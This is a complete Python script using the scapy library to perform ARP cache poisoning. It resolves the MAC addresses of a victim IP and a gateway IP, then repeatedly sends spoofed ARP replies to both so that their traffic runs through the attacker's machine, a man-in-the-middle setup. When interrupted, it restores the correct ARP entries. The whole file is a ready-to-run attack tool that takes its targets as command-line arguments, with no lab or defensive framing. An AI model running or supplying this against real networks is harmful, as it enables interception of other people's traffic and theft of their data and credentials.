from scapy.all import ARP, Ether, send, srp
import time
import sys

def get_mac(ip):
    """Send ARP request to fetch the MAC for a given IP."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/
                 ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        return None

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Continuously send spoofed ARP replies."""
    poison_v = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    poison_g = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
    print(f"[+] Poisoning {victim_ip} and {gateway_ip}...")
    try:
        while True:
            send(poison_v, verbose=False)
            send(poison_g, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopped, restoring network...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send correct ARP replies to undo the poison."""
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac),
         count=5, verbose=False)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),
         count=5, verbose=False)
    print("[+] ARP tables restored.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim IP> <gateway IP>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    if not victim_mac or not gateway_mac:
        print("[-] Could not find MAC addresses. Exiting.")
        sys.exit(1)

    poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
